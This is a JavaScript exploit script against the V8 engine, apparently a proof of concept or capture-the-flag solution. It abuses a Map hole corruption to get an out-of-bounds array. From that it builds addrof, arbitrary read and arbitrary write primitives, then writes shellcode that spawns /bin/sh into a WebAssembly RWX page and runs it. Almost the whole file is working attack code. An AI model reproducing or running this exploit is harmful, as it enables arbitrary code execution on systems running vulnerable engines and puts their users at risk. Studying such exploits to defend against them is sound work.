var _b = new ArrayBuffer(16);
var _f = new Float64Array(_b);
var _i = new BigUint64Array(_b);

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function f2i(f) 
{
    _f[0] = f;
    return _i[0];
}

function i2f(i)
{
    _i[0] = i;
    return _f[0];
}

function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function d2u(v)
{
    f64[0] = v;
    return u32[0];
}

function u2d(lo, hi) 
{
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

let m;
let oob_array;

m = new Map();
var set = new Set();
m.set(1, 1);  // avoid shrinkage
m.set(set.hole(), 1);
m.delete(set.hole());
m.delete(set.hole());
m.delete(1);
m.set(0x15, -1);
oob_array = [1.1];
m.set(0x1006, 12);

var object = {
    "tag": 0xdead,
    "leak": 0xbeef,
};

var arr = [1.1, 2.1, 3.1];

// addrof
function addrof(obj) {
    object.leak = obj;
    return BigInt(d2u(oob_array[5]));
}

function aar(addr) {
    let elements = f2i(oob_array[19]);
    elements &= (0xffffffffn << 32n);
    elements |= addr - 8n;
    oob_array[19] = i2f(elements);
    return f2i(arr[0]);
}

function aar_off(addr) {
    let elements = f2i(oob_array[19]);
    elements &= (0xffffffffn << 32n);
    elements |= addr - 8n;
    oob_array[19] = i2f(elements);
    return d2u(arr[0]);
}

function aaw(addr, value) {
    let elements = f2i(oob_array[19]);
    elements &= (0xffffffffn << 32n);
    elements |= addr - 8n;
    oob_array[19] = i2f(elements)
    arr[0] = i2f(value);
}

dv = new DataView(new ArrayBuffer(0x1000));
dv_addr = addrof(dv);
dv_buffer = aar(dv_addr + 0xcn);
// %DebugPrint(dv);
console.log("dv_buffer", "0x"+dv_buffer.toString(16));
// fflush();
// var x = readline();
set_dv_backing_store = (addr) => {
    aaw(dv_buffer + 0x1cn, addr);
}

let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;
const shellcode = new Uint8Array([72, 184, 47, 98, 105, 110, 47, 115, 104, 0, 153, 80, 84, 95, 82, 102, 104, 45, 99, 84, 94, 82, 232, 10, 0, 0, 0, 47, 98, 105, 110, 47, 115, 104, 0, 0, 0, 86, 87, 84, 94, 106, 59, 88, 15, 5]);
console.log(addrof(wasm_instance).toString(16));


let rwx = aar(addrof(wasm_instance) + 0x60n);

console.log("shellcode location",  "0x"+ rwx.toString(16));

set_dv_backing_store(rwx);

for (let i = 0; i < shellcode.length; i++) {
    dv.setUint8(i, shellcode[i]);
}

f();


